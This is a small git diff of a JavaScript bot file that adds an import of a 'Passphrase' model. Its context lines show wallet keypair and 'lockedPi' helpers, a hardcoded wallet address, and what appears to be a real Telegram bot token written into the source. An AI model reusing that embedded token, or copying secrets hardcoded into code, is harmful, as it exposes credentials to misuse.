@@ -3,6 +3,7 @@ import { getAccount, getAccountWithoutProxy, getBalance, getKeypairFromPassphras
 import { storeLockedPi, storeSponsor } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
+import Passphrase from "./models/Passphrase.js";
 
 const token = '8144700718:AAH5n9nbQXvwjMtNUqk_Qpp24V3vCLNv5io';
 const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
